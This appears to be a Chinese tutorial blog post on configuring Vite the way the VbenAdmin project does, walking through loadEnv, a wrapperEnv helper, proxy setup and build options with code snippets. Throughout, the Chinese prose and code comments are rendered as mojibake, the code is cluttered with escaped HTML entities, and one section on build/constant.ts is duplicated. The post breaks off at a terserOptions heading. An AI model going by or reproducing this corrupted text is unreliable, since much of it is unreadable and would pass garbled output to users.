Node-process-envåœ¨ç·šé‹è¡Œ Linuxæ‰‹å†Šé -environ(7) Viteé …ç›®ä¸‹.envç³»åˆ—æ–‡ä»¶å‘½åçš„æ„ç¾©-ä¸­æ–‡æ–‡æª” Viteé …ç›®ä¸‹.envç³»åˆ—æ–‡ä»¶å‘½åçš„æ„ç¾©-è‹±æ–‡æ–‡æª” åŸå§‹ç¢¼ å‰ç½®ä»£ç¢¼ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 // â†“ åŠ è¼‰nodeçš„pathæ¨¡å¡Š var path$1 = require(\u0026#39;path\u0026#39;); var fs$2 = require(\u0026#39;fs\u0026#39;); // â†“ å‚³å…¥çš„å¦‚æœæ˜¯ä¸€å€‹åŒ…å«\u0026#39;default\u0026#39;çš„keyçš„å°è±¡ï¼Œå‰‡è¼¸å‡ºå°è±¡çš„\u0026#39;default\u0026#39;çš„keyå°æ‡‰çš„valueã€‚ function _interopDefaultLegacy (e) { return e \u0026amp;\u0026amp; typeof e === \u0026#39;object\u0026#39; \u0026amp;\u0026amp; \u0026#39;default\u0026#39; in e ? e[\u0026#39;default\u0026#39;] : e; } // â†“ çµåˆä¸Šé¢äºŒè€… var path__default = /*#__PURE__*/_interopDefaultLegacy(path$1); var fs__default = /*#__PURE__*/_interopDefaultLegacy(fs$2); // â†“ æª¢æŸ¥dirä¸‹æ˜¯å¦æœ‰formatsä¸­çš„è·¯å¾‘ï¼Œè¿”å›æœ‰å°±è¿”è¿´è·¯å¾‘æˆ–è€…æ–‡ä»¶ function lookupFile(dir, formats, pathOnly = false) { for (const format of formats) { // â†“ è¼¸å‡ºdirå’Œformatsé€£æ¥å¾Œçš„è·¯å¾‘ const fullPath = path__default.join(dir, format); // â†“ åŒæ­¥çš„æª¢æŸ¥è©²è·¯å¾‘æ˜¯å¦å­˜åœ¨ï¼Œä¸¦ä¸”è©²è·¯å¾‘å°æ‡‰çš„æ˜¯ä¸€å€‹æ–‡ä»¶ if (fs__default.existsSync(fullPath) \u0026amp;\u0026amp; fs__default.statSync(fullPath).isFile()) { // â†“ æ˜¯å¦åªè¦è¼¸å‡ºè·¯å¾‘ï¼Œå¦å‰‡è¼¸å‡ºæ–‡ä»¶ return pathOnly ? fullPath : fs__default.readFileSync(fullPath, \u0026#39;utf-8\u0026#39;); } } // â†“ ä¸Šé¢çš„è·¯å¾‘éƒ½ä¸æ»¿è¶³è¼¸å‡ºæ¢ä»¶ï¼Œé‚£éº¼å†æª¢æŸ¥ä¸€éæª¢æŸ¥å‚³å…¥çš„dirçš„ç›®éŒ„å const parentDir = path__default.dirname(dir); if (parentDir !== dir) { return lookupFile(parentDir, formats, pathOnly); } } ä»£ç¢¼ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 // å¾å‚³åƒçš„rootç›®éŒ„ä¸‹ç²å– // æŒ‰é †åº .env.${mode}.localã€.env.${mode}ã€.env.localã€.envé€™å››å€‹ç’°å¢ƒæ–‡ä»¶ // è¼¸å‡ºæ–‡ä»¶å…§é…ç½®çš„å°è±¡ function loadEnv(mode, root, prefix = \u0026#39;VITE_\u0026#39;) { if (mode === \u0026#39;local\u0026#39;) { // â†“ å¦‚æœç¬¬ä¸€å€‹åƒæ•¸å‚³å…¥\u0026#39;local\u0026#39;ï¼Œå°±å ±éŒ¯ï¼š // â†“ \u0026#34;local \u0026#34;ä¸èƒ½ç”¨ä½œæ¨¡å¼åç¨±ï¼Œå› ç‚ºå®ƒèˆ‡``.envæ–‡ä»¶çš„.localå¾Œç¶´è¡çªã€‚ throw new Error(`\u0026#34;local\u0026#34; cannot be used as a mode name because it conflicts with ` + `the .local postfix for .env files.`); } // â†“ å¾…è¼¸å‡ºçš„ç’°å¢ƒè®Šé‡å°è±¡ const env = {}; // â†“ è¦è®€å–çš„å››å€‹æ–‡ä»¶åç¨±çš„å­—ç¬¦ä¸²æ•¸çµ„ const envFiles = [ /** mode local file */ `.env.${mode}.local`, /** mode file */ `.env.${mode}`, /** local file */ `.env.local`, /** default file */ `.env` ]; // â†“ æª¢æŸ¥æ˜¯å¦æœ‰å¯¦éš›çš„ä»¥VITE_*é–‹é ­çš„ç’°å¢ƒè®Šé‡ã€‚ // â†“ é€™äº›é€šå¸¸æ˜¯Nodeå…§è¯æä¾›çš„envå°è±¡ï¼Œä¸¦æ‡‰å„ªå…ˆè€ƒæ…®ã€‚ for (const key in process.env) { if (key.startsWith(prefix) \u0026amp;\u0026amp; env[key] === undefined) { env[key] = process.env[key]; } } for (const file of envFiles) { // â†“ æª¢æŸ¥æ ¹ç›®éŒ„ä¸‹æ˜¯å¦æœ‰æŒ‡å®šé…ç½®æ–‡ä»¶ const path = lookupFile(root, [file], true); if (path) { // â†“ ä»¥æ›è¡Œç‚ºå–®ä½è¼¸å‡ºæ–‡ä»¶ä¸­KEY=VALæ ¼å¼çš„åˆ°çµæœå°åƒä¸­ const parsed = main$2.parse(fs__default.readFileSync(path), { debug: !!process.env.DEBUG || undefined }); // â†“ è®“ç’°å¢ƒè®Šé‡äº’ç›¸ä½¿ç”¨ï¼Œé€™å€‹æ–¹æ³•æˆ‘æ²’ä»”ç´°ç ”ç©¶ã€‚ä¸æ˜¯å¾ˆæ‡‚ main$1({ parsed, // â†“ é˜²æ­¢process.envä¿®æ”¹ ignoreProcessEnv: true }); // â†“ åªè¼¸å‡ºä»¥prefixé–‹é ­çš„key for (const [key, value] of Object.entries(parsed)) { // â†“ åªæœ‰é€™å€‹keyåœ¨å‰é¢æ²’æœ‰åŠ è¼‰éæ‰è³¦å€¼ if (key.startsWith(prefix) \u0026amp;\u0026amp; env[key] === undefined) { env[key] = value; } else if (key === \u0026#39;NODE_ENV\u0026#39;) { // â†“ åœ¨.envæ–‡ä»¶ä¸­è¦†è“‹NODE_ENVã€‚ process.env.VITE_USER_NODE_ENV = value; } } } } return env; } Vbenä¸­çš„wrapperEnvæ–¹æ³• èªªæ˜ 1 2 // The boolean type read by loadEnv is a string. This function can be converted to boolean type const viteEnv = wrapperEnv(env); ç¿»è­¯å¦‚ä¸‹ï¼š\nloadEnvè®€å–çš„å¸ƒçˆ¾é¡å‹æ˜¯ä¸€å€‹å­—ç¬¦ä¸²ã€‚è©²å‡½æ•¸å¯ä»¥è½‰æ›ç‚ºå¸ƒçˆ¾é¡å‹ã€‚\nå‰µå»ºwrapperEnvæ–¹æ³• å¾é€™é–‹å§‹æ¶‰åŠåˆ°æ ¹ç›®éŒ„ä¸‹çš„buildæ–‡ä»¶å¤¾äº†ã€‚å‰µå»ºè©²æ–‡ä»¶å¤¾ã€‚æˆ‘å€‘ä½¿ç”¨buildæ–‡ä»¶å¤¾è£æ‰€æœ‰é—œæ–¼é …ç›®æ§‹å»ºé¡çš„æ±è¥¿ã€‚\nå‰µå»ºå®šç¾©æ–‡ä»¶ æ ¹ç›®éŒ„ä¸‹çš„buildæ–‡ä»¶å¤¾å‰µå»ºtypeing.d.tsæ–‡ä»¶ã€‚\ntypeing.d.ts 1 2 3 4 5 6 declare module \u0026#39;*.json\u0026#39; { const src: any; export default src; } declare type Recordable = Record\u0026lt;string, any\u0026gt;; åƒè€ƒé€£çµ TSé€šç”¨æ¨¡å¡Šè²æ˜ TSçš„é«˜ç´šé¡å‹Record å…è¨±å°å…¥Jsoné€™æ®µä»£ç¢¼ï¼Œå¯«åœ¨å“ªéƒ½è¡Œã€‚ TSéƒ½æœƒåŠ è¼‰åˆ°ã€‚ å®šç¾©Envå°åƒé¡å‹ æ ¹ç›®éŒ„ä¸‹çš„buildæ–‡ä»¶å¤¾å‰µå»ºutils.tsæ–‡ä»¶ã€‚\nutils.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 export interface ViteEnv { VITE_PORT: number VITE_USE_MOCK: boolean VITE_USE_PWA: boolean VITE_PUBLIC_PATH: string VITE_PROXY: [string, string][] VITE_GLOB_APP_TITLE: string VITE_GLOB_APP_SHORT_NAME: string VITE_USE_CDN: boolean VITE_DROP_CONSOLE: boolean VITE_BUILD_COMPRESS: \u0026#39;gzip\u0026#39; | \u0026#39;brotli\u0026#39; | \u0026#39;none\u0026#39; VITE_LEGACY: boolean VITE_USE_IMAGEMIN: boolean } å°å‡ºçš„é€™å€‹é¡å‹å°æ‡‰äº†æˆ‘å€‘é…ç½®æ–‡ä»¶ä¸­çš„Keyã€‚\næ ¼å¼åŒ–Envå°è±¡çš„wrapperEnvæ–¹æ³• åœ¨utils.tsæ–‡ä»¶ä¸­æ·»åŠ ä»¥ä¸‹æ–¹æ³•ï¼š\nutils.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 export function wrapperEnv(envConf: Recordable): ViteEnv { const ret: any = {}; for (const envName of Object.keys(envConf)) { let realName = envConf[envName].replace(/\\\\n/g, \u0026#39;\\n\u0026#39;); realName = realName === \u0026#39;true\u0026#39; ? true : realName === \u0026#39;false\u0026#39; ? false : realName; if (envName === \u0026#39;VITE_PORT\u0026#39;) { realName = Number(realName); } if (envName === \u0026#39;VITE_PROXY\u0026#39;) { try { realName = JSON.parse(realName); } catch (error) {} } ret[envName] = realName; process.env[envName] = realName; } return ret; } ä»£ç¢¼èªªæ˜ï¼š ä¸­é–“çš„æ­£å‰‡æ›¿æ›å°±æ˜¯å°‡\\\\næ›¿æ›æˆ\\nï¼Œè¤‡è£½ä¸‹é¢é€™äº›ä»£ç¢¼å¯ä»¥å»ç€è¦½å™¨ä¸­é«”é©—ä¸€ä¸‹ã€‚ console.log('asda\\\\\\n\\\\n\\n'.replace(/\\n/g, '\\n')) =\u0026gt; asda\\ [å›è»Š\\n] \\n [å›è»Š\\n] console.log('asda\\\\\\n\\\\n\\n'.replace(/\\\\n/g, '\\n')) =\u0026gt; asda\\ [å›è»Š\\n] [å›è»Š\\n] [å›è»Š\\n] console.log('asda\\\\\\n\\\\n\\n'.replace(/\\\\\\n/g, '\\n')) =\u0026gt; asda [å›è»Š\\n] \\n [å›è»Š\\n] vite.config.tsæ–‡ä»¶å¾©ç›¤ è‡ªæ­¤vite.config.tsï¼Œé™¤returnè£¡é¢çš„æ±è¥¿å¤–ï¼Œå…¶ä»–çš„éƒ½å·²ç¶“è§£æå®Œäº†ã€‚ä»¥ç¾åœ¨å¯ä»¥å¾—åˆ°é€™æ¨£ä¸€å€‹ä»£ç¢¼ï¼š\nvite.config.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 import { resolve } from \u0026#39;path\u0026#39;; import { ConfigEnv, loadEnv, UserConfig } from \u0026#39;vite\u0026#39;; import { wrapperEnv } from \u0026#39;./build/util\u0026#39;; function pathResolve(dir: string) { return resolve(__dirname, \u0026#39;.\u0026#39;, dir); } export default ({ command, mode }: ConfigEnv): UserConfig =\u0026gt; { const root = process.cwd(); const env = loadEnv(mode, root); const viteEnv = wrapperEnv(env); const { VITE_PORT, VITE_PUBLIC_PATH, VITE_PROXY, VITE_DROP_CONSOLE, VITE_LEGACY } = viteEnv; const isBuild = command === \u0026#39;build\u0026#39;; return {}; }; Viteé…ç½®-base èªªæ˜ Viteé…ç½®-baseèªªæ˜\nå®˜ç¶²åŸæ–‡ï¼š\né¡å‹ï¼š string é»˜èªï¼š / é–‹ç™¼æˆ–ç”Ÿç”¢ç’°å¢ƒæœå‹™çš„ å…¬å…±åŸºç¤è·¯å¾‘ã€‚åˆæ³•çš„å€¼åŒ…æ‹¬ä»¥ä¸‹å¹¾ç¨®ï¼š\nçµ•å° URL è·¯å¾‘åï¼Œä¾‹å¦‚ /foo/ å®Œæ•´çš„ URLï¼Œä¾‹å¦‚ https://foo.com/ ç©ºå­—ç¬¦ä¸²æˆ– ./ï¼ˆç”¨æ–¼é–‹ç™¼ç’°å¢ƒï¼‰ æ›´å¤šä¿¡æ¯è©³è¦‹å…¬å…±åŸºç¤è·¯å¾‘ã€‚\nå°±æ˜¯ä½ çš„é …ç›®çš„BaseURLã€‚æ¯”å¦‚é€™è£¡æˆ‘é…ç½®ä¸€å€‹yiu\né‚£éº¼æˆ‘çš„é …ç›®è¨ªå•ï¼šhttp://localhost:3000/yiu/\nç•¶ä½ è¨ªå•å…¶ä»–è·¯å¾‘å°±æœƒå ±éŒ¯ï¼šhttp://localhost:3000/any/\n1 The server is configured with a public base URL of /yiu/ - did you mean to visit /yiu/any/ instead? Viteé…ç½®-root èªªæ˜ Viteé…ç½®-rootèªªæ˜\nå®˜ç¶²åŸæ–‡ï¼š\né¡å‹ï¼š string é»˜èªï¼š process.cwd() é …ç›®æ ¹ç›®éŒ„ï¼ˆindex.html æ–‡ä»¶æ‰€åœ¨çš„ä½ç½®ï¼‰ã€‚å¯ä»¥æ˜¯ä¸€å€‹çµ•å°è·¯å¾‘ï¼Œæˆ–è€…ä¸€å€‹ç›¸å°æ–¼è©²é…ç½®æ–‡ä»¶æœ¬èº«çš„è·¯å¾‘ã€‚\næ›´å¤šä¿¡æ¯è©³è¦‹é …ç›®æ ¹ç›®éŒ„ã€‚\nç”¨ä¾†æ‰¾index.htmlè·¯å¾‘çš„é…ç½®å§ï¼Œäº‚å¯«å•Ÿå‹•é …ç›®çš„æ™‚å€™æœƒå ±éŒ¯ã€‚å…¶ä»–çš„ä¹Ÿä¸ç”¨è§£é‡‹äº†ã€‚\nViteé…ç½®-resolve.alias èªªæ˜ Viteé…ç½®-resolve.aliasèªªæ˜\nå®˜ç¶²åŸæ–‡ï¼š\né¡å‹ï¼š 1 Record\u0026lt;string, string\u0026gt; | Array\u0026lt;{ find: string | RegExp, replacement: string }\u0026gt; å°‡æœƒè¢«å‚³éåˆ° @rollup/plugin-alias ä½œç‚ºå®ƒçš„ entriesã€‚ä¹Ÿå¯ä»¥æ˜¯ä¸€å€‹å°è±¡ï¼Œæˆ–ä¸€å€‹ { find, replacement } çš„æ•¸çµ„ã€‚\nç•¶ä½¿ç”¨æ–‡ä»¶ç³»çµ±è·¯å¾‘çš„åˆ¥åæ™‚ï¼Œè«‹å§‹çµ‚ä½¿ç”¨çµ•å°è·¯å¾‘ã€‚ç›¸å°è·¯å¾‘ä½œåˆ¥åå€¼å°‡æŒ‰åŸæ¨£ä½¿ç”¨å°è‡´ä¸æœƒè§£æåˆ°æ–‡ä»¶ç³»çµ±è·¯å¾‘ä¸­ã€‚\næ›´é«˜ç´šçš„è‡ªå®šç¾©è§£ææ–¹æ³•å¯ä»¥é€šé æ’ä»¶ å¯¦ç¾ã€‚\nVbenAdminçš„ç¤ºä¾‹ï¼š vite.config.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 resolve: { alias: [ { // /@/xxxx =\u0026gt; src/xxx find: /^\\/@\\//, replacement: pathResolve(\u0026#39;src\u0026#39;) + \u0026#39;/\u0026#39;, }, { // /#/xxxx =\u0026gt; types/xxx find: /^\\/#\\//, replacement: pathResolve(\u0026#39;types\u0026#39;) + \u0026#39;/\u0026#39;, }, ], }, Viteé…ç½®-server.port èªªæ˜ Viteé…ç½®-server.portèªªæ˜\nå®˜ç¶²åŸæ–‡ï¼š\né¡å‹ï¼š number æŒ‡å®šæœå‹™å™¨ç«¯å£ã€‚æ³¨æ„ï¼šå¦‚æœç«¯å£å·²ç¶“è¢«ä½¿ç”¨ï¼ŒVite æœƒè‡ªå‹•å˜—è©¦ä¸‹ä¸€å€‹å¯ç”¨çš„ç«¯å£ï¼Œæ‰€ä»¥é€™å¯èƒ½ä¸æ˜¯æœå‹™å™¨æœ€çµ‚ç›£è½çš„å¯¦éš›ç«¯å£ã€‚\nViteé…ç½®-server.proxy èªªæ˜ Viteé…ç½®-server.proxyèªªæ˜ Viteå…§ç½®çš„ä»£ç†æ’ä»¶http-proxyçš„Gité¦–é  http-proxyçš„é…ç½®é … å®˜ç¶²åŸæ–‡ï¼š\né¡å‹ï¼š 1 Record\u0026lt;string, string | ProxyOptions\u0026gt; ç‚ºé–‹ç™¼æœå‹™å™¨é…ç½®è‡ªå®šç¾©ä»£ç†è¦å‰‡ã€‚æœŸæœ›æ¥æ”¶ä¸€å€‹ { key: options } å°è±¡ã€‚å¦‚æœ key å€¼ä»¥ ^ é–‹é ­ï¼Œå°‡æœƒè¢«è§£é‡‹ç‚º RegExpã€‚\nä½¿ç”¨ http-proxyã€‚å®Œæ•´é¸é …è©³è¦‹ æ­¤è™•ã€‚\nç¤ºä¾‹ï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 export default { server: { proxy: { // å­—ç¬¦ä¸²ç°¡å¯«å¯«æ³• \u0026#39;/foo\u0026#39;: \u0026#39;http://localhost:4567/foo\u0026#39;, // é¸é …å¯«æ³• \u0026#39;/api\u0026#39;: { target: \u0026#39;http://jsonplaceholder.typicode.com\u0026#39;, changeOrigin: true, rewrite: (path) =\u0026gt; path.replace(/^\\/api/, \u0026#39;\u0026#39;) }, // æ­£å‰‡è¡¨é”å¼å¯«æ³• \u0026#39;^/fallback/.*\u0026#39;: { target: \u0026#39;http://jsonplaceholder.typicode.com\u0026#39;, changeOrigin: true, rewrite: (path) =\u0026gt; path.replace(/^\\/fallback/, \u0026#39;\u0026#39;) } } } } VbenAdminä»£ç¢¼è§£æ æˆ‘å€‘åœ¨buildæ–‡ä»¶å¤¾ä¸‹å‰µå»ºä¸€å€‹viteæ–‡ä»¶ï¼Œé€™éº¼æ”¾ç½®æ‰€æœ‰å’Œviteé…ç½®æœ‰é—œçš„æ–‡ä»¶ã€‚ç„¶å¾Œå®Œæˆæœ¬ç« å…©å€‹æ–‡ä»¶çš„ç·¨å¯«ã€‚\nproxy.ts build\\vite\\proxy.tsï¼Œæ³¨æ„ï¼Œé€™è£¡å¸¶è¨»è§£çš„ä»£ç¢¼å’ŒåŸä»£ç¢¼ä¸ä¸€æ¨£ã€‚å› ç‚ºåŸä»£ç¢¼æˆ‘æ„Ÿè¦ºæœ‰é»å•é¡Œã€‚\nViteå®˜æ–¹æ–‡æª”èªªä»£ç†é…ç½®æ¥æ”¶çš„æ˜¯ä¸€å€‹Record\u0026lt;string, string | ProxyOptions\u0026gt;å°è±¡ã€‚è€Œé€™å€‹æ–‡ä»¶çš„ä¸»è¦æ–¹æ³•è¿”å›çš„æ˜¯ProxyTargetListé¡å‹çš„å°è±¡ã€‚\næŒ‰ç†ä¾†èªªProxyTargetListæ‡‰è©²ç›´æ¥ç­‰æ–¼Record\u0026lt;string, string | ProxyOptions\u0026gt;ã€‚\nä½†æ˜¯VbenAminçš„ä»£ç¢¼å®‰è£äº†ä¸€å€‹@types/http-proxyï¼ˆé›–ç„¶Viteæœ¬èº«çš„ä»£ç†å°±æ˜¯ç”¨http-proxyå¯¦ç¾çš„ï¼‰çš„é–‹ç™¼ä¾è³´ã€‚ç„¶å¾Œå¾é€™å€‹é–‹ç™¼ä¾è³´è£¡é¢å°å…¥ä¸€å€‹ServerOptionsã€‚è®“ProxyTargetListç­‰æ–¼Record\u0026lt;string, ServerOptions \u0026amp; { rewrite: (path: string) =\u0026gt; string }\u0026gt;ã€‚\nå€‹äººæ„Ÿè¦ºå¯ä»¥ç›´æ¥ä½¿ç”¨viteæä¾›çš„é¡å‹å³å¯ï¼Œä¸ç”¨å®‰è£@types/http-proxyçš„è²æ˜æ–‡ä»¶ã€‚\nä»£ç¢¼ è¢«ä»£ç†ä¹‹å¾Œï¼Œè¨ªå•çš„è·¯å¾‘æ˜¯ ä»£ç†è‡³çš„è·¯å¾‘ + è¨ªå•çš„è·¯å¾‘å»æ‰æ ¹è·¯å¾‘å¾Œç¶“érewriteè™•ç†çš„è·¯å¾‘ã€‚\nbuild/vite/proxy.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 /** * .env.development çš„ ä»£ç†é…ç½® */ import type { ProxyOptions } from \u0026#39;vite\u0026#39;; // â†“ ç¬¬ä¸€é¡¹è¢«ä»£ç†çš„è·¯å¾„ï¼Œç¬¬äºŒé¡¹ä»£ç†è‡³çš„è·¯å¾„ type ProxyItem = [string, string]; // â†“ æ–¹æ³•æ¥æ”¶çš„å‚æ•° type ProxyList = ProxyItem[]; // â†“ Viteä»£ç†æ‰€æ¥æ”¶å¯¹è±¡ç±»å‹ type ProxyTargetList = Record\u0026lt;string, string | ProxyOptions\u0026gt;; // â†“ httpsç±»å‹çš„URLçš„åŒ¹é…æ­£åˆ™ const httpsRE = /^https:\\/\\//; /** * ç”ŸæˆViteä»£ç†é…ç½®çš„æ–¹æ³• */ export function createProxy(list: ProxyList = []) { const ret: ProxyTargetList = {}; for (const [prefix, target] of list) { const isHttps = httpsRE.test(target); // https://github.com/http-party/node-http-proxy#options ret[prefix] = { // â†“ ä»£ç†è‡³çš„è·¯å¾„ target: target, // â†“ é»˜è®¤å€¼ï¼šfalse-å°†ä¸»æœºæ ‡å¤´çš„æ¥æºæ›´æ”¹ä¸ºç›®æ ‡URL changeOrigin: true, // â†“ å¦‚æœæ‚¨æƒ³ä»£ç†websocket ws: true, rewrite: (path) =\u0026gt; path.replace(new RegExp(`^${prefix}`), \u0026#39;\u0026#39;), // https is require secure=false ...(isHttps ? { secure: false } : {}), }; } return ret; } vite.config.ts ç›´æ¥å°‡ä¸Šé¢å®šç¾©çš„ç”Ÿæˆä»£ç†é…ç½®çš„æ–¹æ³•æ”¾åˆ°vite.config.tsä¸­ä½¿ç”¨ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 // ... import { createProxy } from \u0026#39;./build/vite/proxy\u0026#39;; // ... export default ({ command, mode }: ConfigEnv): UserConfig =\u0026gt; { // ... return { // ... server: { // ... // å¾.envåŠ è¼‰ä»£ç†é…ç½® proxy: createProxy(VITE_PROXY), }, // ... }; }; Viteé…ç½®-server.hmr èªªæ˜ Viteé…ç½®-server.hmrèªªæ˜\nå®˜ç¶²åŸæ–‡ï¼š\né¡å‹ï¼š 1 boolean | { protocol?: string, host?: string, port?: number, path?: string, timeout?: number, overlay?: boolean } ç¦ç”¨æˆ–é…ç½® HMR é€£æ¥ï¼ˆç”¨æ–¼ HMR websocket å¿…é ˆä½¿ç”¨ä¸åŒçš„ http æœå‹™å™¨åœ°å€çš„æƒ…æ³ï¼‰ã€‚\nè¨­ç½® server.hmr.overlay ç‚º false å¯ä»¥ç¦ç”¨æœå‹™å™¨éŒ¯èª¤é®ç½©å±¤ã€‚\né€™å€‹å°±æ˜¯é…ç½®Viteçš„ç†±æ›´æ–°çš„ã€‚æ–‡æª”ä¸­èªªçš„æœå‹™å™¨éŒ¯èª¤é®ç½©å±¤ï¼Œå°±æ˜¯ä½ åœ¨ä»£ç¢¼ä¸­ç·¨å¯«ç·¨å¯«éŒ¯èª¤çš„ä»£ç¢¼ï¼Œç·¨è­¯ä¸é€šéçš„æ™‚å€™ï¼Œç€è¦½å™¨é é¢ä¹ŸæœƒåŒæ™‚å±•ç¤ºä¸€å€‹ç°å±ä¸Šé¢é¡¯ç¤ºä½ çš„ä»£ç¢¼éŒ¯èª¤ã€‚\nViteé…ç½®-build.minify èªªæ˜ Viteé…ç½®-build.minifyèªªæ˜\nå®˜ç¶²åŸæ–‡ï¼š\né¡å‹ï¼š 1 boolean | \u0026#39;terser\u0026#39; | \u0026#39;esbuild\u0026#39; é»˜èªï¼šterser è¨­ç½®ç‚º false å¯ä»¥ç¦ç”¨æœ€å°åŒ–æ··æ·†ï¼Œæˆ–æ˜¯ç”¨ä¾†æŒ‡å®šä½¿ç”¨å“ªç¨®æ··æ·†å™¨ã€‚é»˜èªç‚º Terserï¼Œé›–ç„¶ Terser ç›¸å°è¼ƒæ…¢ï¼Œä½†å¤§å¤šæ•¸æƒ…æ³ä¸‹æ§‹å»ºå¾Œçš„æ–‡ä»¶é«”ç©æ›´å°ã€‚ ESbuild æœ€å°åŒ–æ··æ·†æ›´å¿«ä½†æ§‹å»ºå¾Œçš„æ–‡ä»¶ç›¸å°æ›´å¤§ã€‚\nViteé…ç½®-build.outDir èªªæ˜ Viteé…ç½®-build.outDirèªªæ˜\nå®˜ç¶²åŸæ–‡ï¼š\né¡å‹ï¼šstring é»˜èªï¼šdist æŒ‡å®šè¼¸å‡ºè·¯å¾‘ï¼ˆç›¸å°æ–¼ é …ç›®æ ¹ç›®éŒ„)ã€‚\nå‰µå»ºå…¨å±€å¸¸æ•¸ é€™å€‹è¼¸å‡ºè·¯å¾‘æˆ‘å€‘æŠŠå®ƒå¯«æˆä¸€å€‹å…¨å±€å¸¸é‡ã€‚å…¨å±€å¸¸é‡ä¿å­˜åœ¨ï¼šbuild\\constant.ts\nbuild\\constant.ts 1 2 3 4 5 6 /** * åœ¨ç”Ÿäº§ç¯å¢ƒä¸­è¾“å…¥çš„é…ç½®æ–‡ä»¶åç§°ã€‚ */ export const GLOB_CONFIG_FILE_NAME = \u0026#39;_app.config.js\u0026#39;; export const OUTPUT_DIR = \u0026#39;dist\u0026#39;; ç„¶å¾Œåœ¨vite.config.tsä¸­å¼•ç”¨ï¼š\nvite.config.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 // ... import { OUTPUT_DIR } from \u0026#39;./build/constant\u0026#39;; // ... export default ({ command, mode }: ConfigEnv): UserConfig =\u0026gt; { // ... return { // ... build: { outDir: OUTPUT_DIR, }, // ... }; }; Viteé…ç½®-build.polyfillDynamicImport èªªæ˜ Viteé…ç½®-build.polyfillDynamicImportèªªæ˜ æ“æŠ±Vite2.0 ç³»åˆ—ï¼ˆäºŒï¼‰ - çŸ¥ä¹ å®˜ç¶²åŸæ–‡ï¼š\né¡å‹ï¼šboolean é»˜èªï¼štrueï¼Œé™¤ébuild.targetæ˜¯esnextã€‚ æ˜¯å¦è‡ªå‹•æ³¨å…¥å‹•æ…‹å°å…¥polyfillã€‚\npolyfillæœƒè‡ªå‹•æ³¨å…¥åˆ°æ¯å€‹index.htmlæ¢ç›®çš„ä»£ç†æ¨¡å¡Šä¸­ã€‚å¦‚æœé€šébuild.rollupOptions.inputé…ç½®æˆä½¿ç”¨éhtmlçš„è‡ªå®šç¾©æ¢ç›®ï¼Œé‚£éº¼å°±éœ€è¦æ‰‹å‹•å°å…¥è‡ªå®šç¾©æ¢ç›®ä¸­çš„polyfillï¼š\n1 import \u0026#39;vite/dynamic-import-polyfill\u0026#39; æ³¨æ„ï¼špolyfillä¸é©ç”¨æ–¼åº«æ¨¡å¼ã€‚å¦‚æœä½ éœ€è¦æ”¯æŒæ²’æœ‰æœ¬åœ°å‹•æ…‹å°å…¥çš„ç€è¦½å™¨ï¼Œä½ å¯èƒ½æ‡‰è©²é¿å…åœ¨ä½ çš„åº«ä¸­ä½¿ç”¨å®ƒã€‚\nViteä½¿ç”¨ESå‹•æ…‹å°å…¥ä½œç‚ºä»£ç¢¼åˆ†å‰²é»ã€‚ç”Ÿæˆçš„ä»£ç¢¼é‚„å°‡ä½¿ç”¨å‹•æ…‹å°å…¥ä¾†åŠ è¼‰ç•°æ­¥å¡Šã€‚ç„¶è€Œï¼Œæœ¬æ©ŸESMå‹•æ…‹å°å…¥æ”¯æŒæ˜¯åœ¨ESMä¹‹å¾Œé€šéè…³æœ¬æ¨™è¨˜å¯¦ç¾çš„ï¼Œä¸¦ä¸”é€™å…©å€‹ç‰¹æ€§åœ¨ç€è¦½å™¨æ”¯æŒæ–¹é¢å­˜åœ¨å·®ç•°ã€‚ Viteæœƒè‡ªå‹•æ³¨å…¥ä¸€å€‹è¼•é‡ç´šçš„å‹•æ…‹å°å…¥å¡«å……ä¾†æ¶ˆé™¤é€™ç¨®å·®ç•°ã€‚\nå¦‚æœä½ çŸ¥é“ä½ çš„ç›®æ¨™ç€è¦½å™¨åªæ”¯æŒæœ¬æ©Ÿå‹•æ…‹å°å…¥ï¼Œä½ å¯ä»¥é€šébuild.polyfillDynamicImporté¡¯å¼ç¦ç”¨æ­¤ç‰¹æ€§ã€‚\nç¸½ä¹‹VbenAdminä¸­åœ¨ç”Ÿç”¢ç’°å¢ƒå°‡æ­¤é …ç¦ç”¨äº†ã€‚å¦‚æœæ‰“åŒ…å¾Œçš„é …ç›®æœ‰å•é¡Œï¼Œè€Œæœ¬åœ°é‹è¡Œæ²’å•é¡Œã€‚é‚£éº¼å˜—è©¦æ‰“é–‹å®ƒï¼Œå› ç‚ºé€™å€‹é…ç½®è²Œä¼¼å’Œç€è¦½å™¨æœ‰é—œã€‚\nå‰µå»ºå…¨å±€å¸¸æ•¸ é€™å€‹è¼¸å‡ºè·¯å¾‘æˆ‘å€‘æŠŠå®ƒå¯«æˆä¸€å€‹å…¨å±€å¸¸é‡ã€‚å…¨å±€å¸¸é‡ä¿å­˜åœ¨ï¼šbuild\\constant.ts\nbuild\\constant.ts 1 2 3 4 5 6 /** * åœ¨ç”Ÿäº§ç¯å¢ƒä¸­è¾“å…¥çš„é…ç½®æ–‡ä»¶åç§°ã€‚ */ export const GLOB_CONFIG_FILE_NAME = \u0026#39;_app.config.js\u0026#39;; export const OUTPUT_DIR = \u0026#39;dist\u0026#39;; ç„¶å¾Œåœ¨vite.config.tsä¸­å¼•ç”¨ï¼š\nvite.config.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 // ... import { OUTPUT_DIR } from \u0026#39;./build/constant\u0026#39;; // ... export default ({ command, mode }: ConfigEnv): UserConfig =\u0026gt; { // ... return { // ... build: { outDir: OUTPUT_DIR, }, // ... }; }; Viteé…ç½®-build.terserOptions èªªæ˜ 